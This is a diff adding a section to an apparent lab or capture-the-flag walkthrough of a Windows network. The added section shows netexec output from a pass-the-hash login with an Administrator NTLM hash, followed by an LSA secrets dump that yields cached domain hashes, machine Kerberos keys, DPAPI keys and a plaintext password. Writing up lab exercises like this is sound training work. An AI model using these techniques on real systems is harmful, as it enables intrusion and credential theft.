@@ -607,7 +607,6 @@ Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Wh
 
 C:\Users\Administrator\Desktop
 C:\Share
-C:\Documents and Settings\Administrator\Desktop
 ```
 After a long journey, we finally get the 15th flag from C:\Users\Administrator\Desktop:
 ```
@@ -620,4 +619,22 @@ bf22a1d0acfca4af517e1417a80e92d1
 ```
 
 ### Seventeenth Flag:
+From the hashdump, we found (Unknown User):Gr8hambino!, we potentially can find the username using netexec (formerly crackmapexec) and we do along with additional data:
+```
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] Dumping LSA secrets
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aes256-cts-hmac-sha1-96:6791ba2d6b86986e2aecd4c1c06980b52840cbc3242f42cbe9d57caf02761fa7
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aes128-cts-hmac-sha1-96:3f91ba89035055afb5595488e66b8909
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:des-cbc-md5:94f8e3160113235d
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:plain_password_hex:1e7be7b31d2e60c85ce045e6baaaa927e69245d6227ac9126972e94778d24b61c123220104ecfd244291f7607a4160a7f0501cc2d41ea8951712f502f0c269c616777d6967480098f5daf64cffe22bbbd191dc4ae21ea7120639c62ffbff0b441c8a3f439cf74a857412595e08d05ebeab855d79811b89ebd6b735cafcce0b78ec0cf185095ab8e868455de6630b2be07489b045aee896b76e5a6eebd18d4712d285389bffe42a29168d9770ec831281d06002345ac89d3decc8f29d25864704e5b6cd4d05f1992aeca2aa02baf0b23167e2062d443fb2bb54a612bd91412054c5ea3f557376df8225b0790179fa56ec
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aad3b435b51404eeaad3b435b51404ee:7f4bdd5132d1125539db0398538eb8b3:::
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\hporter:Gr8hambino!
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
+dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
+```
+Where we can see hporter:Gr8hambino!
 
+These credentials may be for a domain user. 
